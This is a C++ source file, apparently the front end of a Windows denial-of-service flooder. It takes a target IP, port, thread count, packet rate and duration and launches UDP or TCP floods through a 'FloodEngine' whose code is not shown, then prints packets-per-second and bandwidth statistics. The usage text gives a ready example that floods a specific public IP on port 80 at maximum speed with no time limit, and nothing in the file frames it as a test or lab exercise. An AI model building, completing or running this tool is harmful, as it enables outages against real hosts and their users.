#include <iostream>
#include <string>
#include <csignal>
#include <thread>
#include <chrono>
#include <WinSock2.h>
#include "flood_engine.h"

#pragma comment(lib, "ws2_32.lib")

FloodEngine* engine_ptr = nullptr;
std::atomic<bool> running{true};

void signal_handler(int signal) {
    running = false;
    if (engine_ptr) engine_ptr->stop();
}

void print_usage(const char* prog) {
    std::cout << "Usage: " << prog << " <mode> <ip> <port> <threads> <pps> <duration>\n"
              << "Mode: udp | tcp\n"
              << "pps: 0 for max speed\n"
              << "duration: 0 for infinite\n"
              << "\nExample (Max speed, infinite):\n"
              << "  " << prog << " tcp 111.63.65.242 80 4 0 0\n";
}

int main(int argc, char* argv[]) {
    if (argc != 7) { print_usage(argv[0]); return 1; }

    WSAData wsa; WSAStartup(MAKEWORD(2, 2), &wsa);

    std::string mode_str = argv[1];
    uint16_t port = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);
    uint64_t target_pps = std::strtoull(argv[5], nullptr, 10);
    uint32_t duration = (uint32_t)std::atoi(argv[6]);

    int mode = (mode_str == "udp") ? 0 : (mode_str == "tcp" ? 1 : -1);
    if (mode == -1) { print_usage(argv[0]); WSACleanup(); return 1; }

    uint32_t dst_ip = inet_addr(argv[2]);
    if (dst_ip == INADDR_NONE) { std::cerr << "Invalid IP\n"; WSACleanup(); return 1; }

    std::signal(SIGINT, signal_handler);

    FloodEngine engine(threads, dst_ip, port, mode, target_pps, duration);
    engine_ptr = &engine;
    engine.start();

    std::cout << "Flooding started. PPS Limit: " << (target_pps == 0 ? "MAX" : std::to_string(target_pps)) 
              << " | Duration: " << (duration == 0 ? "INFINITE" : std::to_string(duration) + "s") << "\n";
    
    uint64_t last_sent = 0;
    auto main_start = std::chrono::high_resolution_clock::now();

    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        uint64_t current_sent = engine.getTotalSent();
        uint64_t pps = current_sent - last_sent;
        last_sent = current_sent;
        
        double mbps = (pps * (mode == 0 ? 28 : 40) * 8) / 1000000.0; // 调整了包大小估算
        printf("[Stats] Total: %llu | Current PPS: %llu | Est. Bandwidth: %.2f Mbps\n", 
               current_sent, pps, mbps);

        if (duration > 0) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::high_resolution_clock::now() - main_start).count();
            if (elapsed >= duration) {
                std::cout << "\nDuration expired. Stopping...\n";
                running = false;
                engine.stop();
            }
        }
    }

    WSACleanup();
    return 0;
}
